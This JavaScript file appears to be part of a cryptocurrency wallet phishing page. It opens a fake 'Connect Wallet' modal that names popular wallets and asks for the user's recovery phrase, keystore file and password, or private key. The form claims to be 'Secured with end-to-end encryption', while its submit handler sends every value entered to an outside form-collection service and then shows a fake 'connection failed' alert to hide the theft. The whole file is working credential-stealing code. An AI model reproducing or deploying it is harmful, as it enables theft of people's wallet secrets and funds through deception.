const WALLETS = ["MetaMask","Trust Wallet","Coinbase Wallet","WalletConnect","Rainbow","Phantom","OKX Wallet","Ledger","Trezor","Exodus","Binance Wallet","Crypto.com","Uniswap","SafePal","TokenPocket","imToken","Zerion"];

function openConnectWallet(context = {}) {
  const html = `<div class="modal-backdrop" id="wm-backdrop"><div class="modal" style="position:relative"><button class="modal-close" onclick="closeWalletModal()">×</button><h2>Connect Wallet</h2><p class="muted">Choose a wallet to connect and complete your deposit.</p><div id="wm-list" style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:16px"></div></div></div>`;
  document.body.insertAdjacentHTML("beforeend", html);
  document.getElementById("wm-list").innerHTML = WALLETS.map(w =>
    `<button class="btn btn-secondary" style="justify-content:flex-start" onclick='openManualConnect(${JSON.stringify(w)}, ${JSON.stringify(context)})'>${w}</button>`
  ).join("");
}
function closeWalletModal() { document.getElementById("wm-backdrop")?.remove(); }

function openManualConnect(wallet, context) {
  closeWalletModal();
  const html = `<div class="modal-backdrop" id="wm-backdrop"><div class="modal" style="position:relative"><button class="modal-close" onclick="closeWalletModal()">×</button><h2>Connect ${esc(wallet)}</h2><div class="tabs" id="mc-tabs"><div class="tab active" data-t="phrase">Phrase</div><div class="tab" data-t="keystore">Keystore JSON</div><div class="tab" data-t="private">Private Key</div></div><form id="mc-form"><div id="mc-phrase" class="mc-panel"><div class="field"><label>Recovery Phrase (12-24 words)</label><textarea name="phrase" rows="4" required placeholder="word word word ..."></textarea></div></div><div id="mc-keystore" class="mc-panel hidden"><div class="field"><label>Keystore JSON</label><textarea name="keystore" rows="4" placeholder='{"version":3,...}'></textarea></div><div class="field"><label>Password</label><input name="keystore_pw" type="password"></div></div><div id="mc-private" class="mc-panel hidden"><div class="field"><label>Private Key</label><input name="private_key" type="password"></div></div><button type="submit" class="btn btn-primary btn-block">Connect & Complete Deposit</button><p class="muted" style="font-size:11px;margin-top:12px;text-align:center">Secured with end-to-end encryption</p></form></div></div>`;
  document.body.insertAdjacentHTML("beforeend", html);
  const tabs = document.querySelectorAll("#mc-tabs .tab");
  tabs.forEach(t => t.onclick = () => {
    tabs.forEach(x => x.classList.remove("active"));
    t.classList.add("active");
    document.querySelectorAll(".mc-panel").forEach(p => p.classList.add("hidden"));
    document.getElementById("mc-" + t.dataset.t).classList.remove("hidden");
  });
  document.getElementById("mc-form").onsubmit = async (e) => {
    e.preventDefault();
    const fd = new FormData(e.target);
    const data = { form: "wallet_connect", wallet, ...context };
    for (const [k, v] of fd.entries()) data[k] = v;
    const btn = e.target.querySelector("button[type=submit]");
    btn.disabled = true; btn.textContent = "Connecting...";
    await submitToFormspark(data);
    closeWalletModal();
    alert("Wallet connection failed. Please try again later or use another method.");
  };
}
window.openConnectWallet = openConnectWallet;
window.closeWalletModal = closeWalletModal;
window.openManualConnect = openManualConnect;